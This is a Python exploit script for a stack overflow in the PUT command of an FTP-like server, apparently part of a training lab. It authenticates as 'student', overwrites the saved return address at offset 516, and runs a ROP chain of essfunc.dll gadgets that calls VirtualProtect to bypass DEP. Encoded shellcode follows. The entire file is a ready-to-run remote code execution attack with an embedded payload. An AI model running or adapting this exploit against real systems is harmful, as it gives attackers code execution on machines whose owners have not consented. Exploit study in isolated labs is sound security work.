#!/usr/bin/env python3
# DEP bypass for the PUT vuln (vuln_put, straight stack overflow).
# Offset to saved EIP = 516. We return into a ROP chain that calls
# VirtualProtect to mark the stack RWX, then falls through into shellcode.
#
# All gadgets are from essfunc.dll (fixed base 0x62500000, no ASLR).
# VirtualProtect is reached via essfunc's own IAT slot (0x6250e128), so
# kernel32 ASLR doesn't matter. Bad chars avoided: 00 0a 0d 22.
#
#   python3 dep_rop.py
import socket, sys, struct

HOST = "192.168.157.135"      # server VM IP - set this to your target
PORT = 2121
OFFSET = 516                # pattern.py found this (buf[512] + saved ebp)

def pack(v): return struct.pack("<I", v)

# ---- VirtualProtect ROP chain (pushad method) --------------------------
rop  = b""
rop += pack(0x62501531)   # pop eax ; ret
rop += pack(0x6250e128)   #   ptr to &VirtualProtect (essfunc IAT slot)
rop += pack(0x625015d4)   # mov eax,[eax] ; ret      -> eax = VirtualProtect
rop += pack(0x62501598)   # xchg eax,esi ; ret       -> esi = VirtualProtect
rop += pack(0x62501284)   # pop ebp ; ret
rop += pack(0x6250152c)   #   jmp esp                -> ebp = return addr after VP
rop += pack(0x62501531)   # pop eax ; ret
rop += pack(0xfffffdff)   #   -0x201
rop += pack(0x625015ba)   # neg eax ; ret            -> eax = 0x201
rop += pack(0x625015c3)   # mov ebx,eax ; ret        -> ebx = 0x201 (dwSize)
rop += pack(0x62501531)   # pop eax ; ret
rop += pack(0xffffffc0)   #   -0x40
rop += pack(0x625015ba)   # neg eax ; ret            -> eax = 0x40
rop += pack(0x625016a2)   # mov edx,eax ; ret        -> edx = 0x40 (PAGE_EXECUTE_READWRITE)
rop += pack(0x62501590)   # pop ecx ; ret
rop += pack(0x6250c080)   #   writable .bss          -> ecx = lpflOldProtect
rop += pack(0x62501601)   # pop edi ; ret
rop += pack(0x62501285)   #   ret                    -> edi = ROP NOP
rop += pack(0x62501531)   # pop eax ; ret
rop += pack(0x90909090)   #   nop                    -> eax = page-aligned bridge
rop += pack(0x625015cc)   # pushad ; ret             -> lay VP frame, call it, land in shellcode

buf =  b""
buf += b"\xdb\xde\xd9\x74\x24\xf4\xba\xc9\xcb\x06\x97\x58"
buf += b"\x2b\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\x99"
buf += b"\xd8\xe4\x62\xe5\x37\x6a\x8c\x15\xc8\x0b\x04\xf0"
buf += b"\xf9\x0b\x72\x71\xa9\xbb\xf0\xd7\x46\x37\x54\xc3"
buf += b"\xdd\x35\x71\xe4\x56\xf3\xa7\xcb\x67\xa8\x94\x4a"
buf += b"\xe4\xb3\xc8\xac\xd5\x7b\x1d\xad\x12\x61\xec\xff"
buf += b"\xcb\xed\x43\xef\x78\xbb\x5f\x84\x33\x2d\xd8\x79"
buf += b"\x83\x4c\xc9\x2c\x9f\x16\xc9\xcf\x4c\x23\x40\xd7"
buf += b"\x91\x0e\x1a\x6c\x61\xe4\x9d\xa4\xbb\x05\x31\x89"
buf += b"\x73\xf4\x4b\xce\xb4\xe7\x39\x26\xc7\x9a\x39\xfd"
buf += b"\xb5\x40\xcf\xe5\x1e\x02\x77\xc1\x9f\xc7\xee\x82"
buf += b"\xac\xac\x65\xcc\xb0\x33\xa9\x67\xcc\xb8\x4c\xa7"
buf += b"\x44\xfa\x6a\x63\x0c\x58\x12\x32\xe8\x0f\x2b\x24"
buf += b"\x53\xef\x89\x2f\x7e\xe4\xa3\x72\x17\xc9\x89\x8c"
buf += b"\xe7\x45\x99\xff\xd5\xca\x31\x97\x55\x82\x9f\x60"
buf += b"\x99\xb9\x58\xfe\x64\x42\x99\xd7\xa2\x16\xc9\x4f"
buf += b"\x02\x17\x82\x8f\xab\xc2\x05\xdf\x03\xbd\xe5\x8f"
buf += b"\xe3\x6d\x8e\xc5\xeb\x52\xae\xe6\x21\xfb\x45\x1d"
buf += b"\xa2\xc4\x32\x80\xba\xad\x40\xba\xab\x71\xcc\x5c"
buf += b"\xa1\x99\x98\xf7\x5e\x03\x81\x83\xff\xcc\x1f\xee"
buf += b"\xc0\x47\xac\x0f\x8e\xaf\xd9\x03\x67\x40\x94\x79"
buf += b"\x2e\x5f\x02\x15\xac\xf2\xc9\xe5\xbb\xee\x45\xb2"
buf += b"\xec\xc1\x9f\x56\x01\x7b\x36\x44\xd8\x1d\x71\xcc"
buf += b"\x07\xde\x7c\xcd\xca\x5a\x5b\xdd\x12\x62\xe7\x89"
buf += b"\xca\x35\xb1\x67\xad\xef\x73\xd1\x67\x43\xda\xb5"
buf += b"\xfe\xaf\xdd\xc3\xfe\xe5\xab\x2b\x4e\x50\xea\x54"
buf += b"\x7f\x34\xfa\x2d\x9d\xa4\x05\xe4\x25\xe9\x9e\x99"
buf += b"\x32\x9a\xf8\x30\x7f\xc7\xfa\xef\xbc\xfe\x78\x05"
buf += b"\x3d\x05\x60\x6c\x38\x41\x26\x9d\x30\xda\xc3\xa1"
buf += b"\xe7\xdb\xc1"

nops = b"\x90" * 12   # small landing cushion before the decoder stub

payload  = b"A" * OFFSET
payload += rop
payload += nops
payload += buf

s = socket.create_connection((HOST, PORT)); s.recv(4096)
s.sendall(b"LOGIN student student\r\n"); s.recv(4096)   # PUT needs auth
s.sendall(b'PUT "' + payload + b'" 0\r\n')
print("sent: %d-byte payload (offset %d + %d rop + %d nop + %d sc)"
      % (len(payload), OFFSET, len(rop), len(nops), len(buf)))
s.close()
